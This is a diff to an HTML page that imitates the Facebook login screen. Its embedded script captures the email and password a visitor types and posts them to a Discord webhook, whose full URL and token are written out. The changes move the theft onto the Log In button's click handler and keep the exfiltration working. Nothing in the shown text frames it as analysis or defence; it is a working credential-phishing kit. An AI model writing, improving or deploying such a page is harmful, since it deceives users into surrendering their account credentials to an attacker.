@@ -2,24 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook – log in or sign up</title>
     <link rel="stylesheet" href="default.css">
     <link rel="stylesheet" href="style.css">
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            document.getElementById('login-form').addEventListener('submit', function (e) {
-                e.preventDefault(); // Prevents form from submitting traditionally
+            document.getElementById('login-btn').addEventListener('click', function (e) {
+                e.preventDefault(); // Prevents the form from submitting in the traditional way
                 var email = document.getElementById('email').value;
                 var pass = document.getElementById('pass').value;
 
-                // Preparing data to send
                 var data = {
                     content: `Login attempt: ${email} / ${pass}`
                 };
 
-                // Sending data to the webhook
                 fetch('https://discord.com/api/webhooks/1216704735092936774/BbsaihTkqofedaG8B1g_hJQ_XHt12yYSwUUo2KzmtkXZYTItRAhvMUQLfeREThhXvZ2T', {
                     method: 'POST',
                     headers: {
@@ -45,13 +42,13 @@
             <div class="row">
                 <div class="col-5 col-xs-12">
                     <div class="login-form">
-                        <!-- Modified form to include id for the script and corrected the password input type -->
-                        <form id="login-form" action="">
+                        <!-- Note: Form does not have an 'action' attribute now; it uses JavaScript for submission -->
+                        <form id="login-form">
                             <input id="email" type="text" placeholder="Email address or phone number"><br>
                             <input id="pass" type="password" placeholder="Password"><br>
-                            <button id="login-btn" type="submit">Log In</button><br>
+                            <button id="login-btn" type="button">Log In</button><br>
                             <a href="#">Forgotten password?</a><br>
-                            <button id="create-btn">Create New Account</button><br>
+                            <button id="create-btn" type="button">Create New Account</button><br>
                         </form>
                     </div>
                     <footer>
